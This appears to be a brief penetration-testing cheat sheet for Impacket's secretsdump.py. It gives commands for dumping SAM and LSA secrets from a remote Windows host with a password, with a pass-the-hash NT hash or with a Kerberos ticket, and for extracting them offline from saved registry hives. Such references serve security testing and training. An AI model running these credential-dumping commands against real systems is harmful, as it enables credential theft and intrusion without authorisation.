Remote Extraction: Authenticate and dump SAM & LSA secrets from a remote system.

```bash
secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET'
```


Pass-the-Hash and Pass-the-Ticket: Utilize hashes or tickets for Kerberos authentication when performing remote dumping.

```bash

secretsdump.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
secretsdump.py -k 'DOMAIN/USER@TARGET'

```


Offline Extraction: Analyze exported hives locally to dump secrets.

```bash
secretsdump.py -sam '/path/to/sam.save' -security '/path/to/security.save' -system '/path/to/system.save' LOCAL
```
